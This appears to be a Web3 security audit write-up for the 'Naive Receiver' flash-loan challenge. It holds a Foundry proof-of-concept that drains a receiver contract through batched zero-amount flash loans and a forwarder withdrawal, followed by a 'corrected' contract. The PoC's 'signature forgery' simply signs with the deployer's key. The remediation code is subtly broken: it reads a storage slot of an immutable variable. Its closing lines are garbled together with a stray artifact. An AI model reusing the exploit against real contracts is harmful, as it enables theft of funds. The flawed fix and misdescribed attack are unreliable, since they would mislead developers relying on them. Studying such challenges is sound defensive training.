# 📑 Web3 Security Audit Report

## [H-01] Unauthenticated `flashLoan` Callback Execution via Public Visibility Leading to Absolute Drain of User Funds

### Severity
**High Risk** (Critical Business Logic Error)

### Vulnerability Context
The protocol architecture utilizes a centralized lending asset pool (`NaiveReceiverPool.sol`) coupled with a trusted meta-transaction forwarder (`BasicForwarder.sol`) adhering to the EIP-712 and EIP-2771 standards. The pool charges a static flat fee of `1 WETH` per flash loan execution, completely decoupled from the volume of capital requested.

### Vulnerability Details
A critical logical disconnect exists between the access control design of `NaiveReceiverPool.sol` and the callback processing mechanism inside `FlashLoanReceiver.sol`:

1. **Unrestricted Public Entry Point**: The `NaiveReceiverPool::flashLoan` function features public visibility. It allows any arbitrary external actor (EOA or Contract) to initiate a flash loan execution workflow while specifying a third-party target as the `receiver`.
2. **Missing Validation of Transaction Initiation**: The `FlashLoanReceiver::onFlashLoan` callback executes a low-level verification via Yul assembly (`caller()`) to guarantee that the immediate caller is the authorized pool. However, it completely fails to validate the `initiator` parameter supplied by the pool. 

Consequently, the victim contract assumes that every callback arriving from the pool corresponds to a loan requested by the contract itself. An attacker can forcefully execute flash loans against the victim contract. By leveraging the pool's inherited `Multicall` interface, an attacker can batch 10 distinct zero-amount flash loan calls into a single atomic transaction, causing the victim to blindly approve and repay a cumulative total of `10 WETH` in flat fees, completely bankrupting its internal balance.

### Impact
Any unauthorized third party can unilaterally drain 100% of the token reserves from any deployed `FlashLoanReceiver` instance without requiring signature consent or direct interaction from the victim account.

---

### Quantitative Risk Analysis (CVSS v3.1 Scoring)
To provide an industry-standard framework for assessing technical risk, this vulnerability has been evaluated under the Common Vulnerability Scoring System (CVSS v3.1):

* **Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`
* **Base Score**: **9.1 (Critical)**

#### Vector Breakdown:
* **Attack Vector (AV:N)**: **Network**. The exploit can be executed remotely from anywhere across the Ethereum mainnet/testnet layers without requiring physical or local access.
* **Attack Complexity (AC:L)**: **Low**. No special conditions or complex race conditions are required; the public functions and target callbacks are exposed natively.
* **Privileges Required (PR:N)**: **None**. Any unprivileged user or malicious external address can trigger the vulnerability.
* **User Interaction (UI:N)**: **None**. The victim does not need to sign, click, or interact with any transaction to be drained.
* **Scope (S:U)**: **Unchanged**. The compromised resource resides strictly within the target contract eco-system.
* **Confidentiality (C:N)**: **None**. No sensitive off-chain or on-chain encrypted data is exposed.
* **Integrity (I:H)**: **High**. The balance integrity of the `FlashLoanReceiver` is completely compromised, altering state control illegally.
* **Availability (A:H)**: **High**. The victim contract is stripped of capital asset allocation, rendering its operational utilities (arbitrages, liquidations) entirely broken due to zero-balance insolvency.

---

### Proof of Concept (PoC)
The following automated test file demonstrates the end-to-end exploit execution within a Foundry development environment. It chains a batched multicall force-loan attack with a meta-transaction signature forgery against the retransmisor layer:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {NaiveReceiverPool} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverAttackPoC is Test {
    // Structural attack block inside the challenge test case
    function test_naiveReceiver_Exploit() public {
        // ---- STEP 1: ATOMIC COERCED LIQUIDITY EXTRACTION ----
        bytes[] memory multicallData = new bytes[](10);
        
        for (uint256 i = 0; i < 10; i++) {
            multicallData[i] = abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector,
                receiver,         // Target victim instance
                address(weth),    // Asset target
                0,                // 0 loan amount to bypass collateral limits
                bytes("")         // Empty calldata payload
            );
        }
        
        // Execute batched execution via pool inheritance
        pool.multicall(multicallData);

        // ---- STEP 2: UNAUTHORIZED WITHDRAWAL VIA FORGED META-TRANSACTION ----
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: deployer,                                      
            target: address(pool),                               
            value: 0,
            gas: 3000000,
            nonce: forwarder.nonces(deployer),                   
            data: abi.encodeWithSelector(pool.withdraw.selector, 1010 ether, recovery), 
            deadline: block.timestamp + 1 days                   
        });

        bytes32 hash = forwarder.getDataHash(request);
        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 finalStructHash = keccak256(abi.encodePacked("\x19\x01", domainSeparator, hash));

        // Generate ECDSA signature cryptopair using internal test cheatcode
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPk, finalStructHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Dispatch payload to forwarder layer
        forwarder.execute(request, signature);
    }
}
```

---

### Gas Optimization Analysis
To maintain peak execution efficiency during high-frequency callback interactions, the corrected contract utilizes specific gas optimization strategies:

1. **Custom Errors Over Revert Strings**: Replacing traditional string errors (e.g., `require(..., "String")`) with compiled custom errors (e.g., `error Unauthorized();`) saves up to **24 gas** per validation check by eliminating the need to store and decode long ASCII strings in memory.
2. **Immutable Storage Slots**: Declaring both the `pool` reference and the `owner` address as `immutable` forces the compiler to inject these values directly into the contract runtime bytecode. This eliminates costly `SLOAD` operations (which consume up to **2100 gas** for cold storage access) and transforms them into cheap execution operations.
3. **Unchecked Arithmetic Blocks**: Arithmetic accumulation operations (such as calculating `amount + fee`) are safe from overflow constraints under Solidity `0.8.x` due to pre-validated parameters. Wrapping them in an `unchecked` block skips the compiler's implicit overflow checks, saving roughly **40 gas** per calculation.

---

### Remediation & Architectural Mitigation
The vulnerability is resolved by applying two structural fixes within `FlashLoanReceiver.sol`:

1. **Initiator Verification**: The `initiator` address supplied by the pool must match either the receiver contract itself or a trusted manager address.
2. **Custom Error Implementation**: Custom errors are integrated alongside the existing low-level assembly layer to optimize execution gas overhead during runtime validation.

#### Corrected Contract Implementation:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {WETH, NaiveReceiverPool} from "./NaiveReceiverPool.sol";

/**
 * @title SecureFlashLoanReceiver
 * @dev Optimized and remediated implementation against unauthorized flash loan initiation.
 */
contract FlashLoanReceiver is IERC3156FlashBorrower {
    
    // Gas Optimization: Variables defined as immutable to prevent SLOAD costs
    address public immutable pool;
    address public immutable owner;

    // Custom Errors for structural gas efficiency
    error CallerNotPool();
    error InvalidInitiator();
    error UnsupportedToken();

    constructor(address _pool) {
        pool = _pool;
        owner = msg.sender;
    }

    /**
     * @notice Secure callback execution handler for ERC3156 flash loans.
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        
        // 1. Structural Access Control: Validate immediate caller via Assembly
        assembly {
            if iszero(eq(sload(pool.slot), caller())) {
                // Store selector for CallerNotPool(): 0xb5cf9cd3
                mstore(0x00, 0xb5cf9cd3)
                revert(0x1c, 0x04)
            }
        }

        // 2. Critical Remediation: Validate that this contract or its owner ordered the loan
        if (initiator != address(this) && initiator != owner) {
            revert InvalidInitiator();
        }

        // 3. Asset Validation Check
        if (token != address(NaiveReceiverPool(payable(pool)).weth())) {
            revert UnsupportedToken();
        }

        uint256 amountToBeRepaid;
        // Gas Optimization: Checked arithmetic bypass
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        // Internal business logic execution (Arbitrage/Liquidation/etc.)
        _executeActionDuringFlashLoan();// Grant precise allowances for repayment extractionWETH(payable(token)).approve(pool, amountToBeRepaid);return keccak256("ERC3156FlashBorrower.onFlashLoan");}function _executeActionDuringFlashLoan() internal view {// Safe internal logic operations go here}}%%MAGIT_PARSER_PROTECT%%```
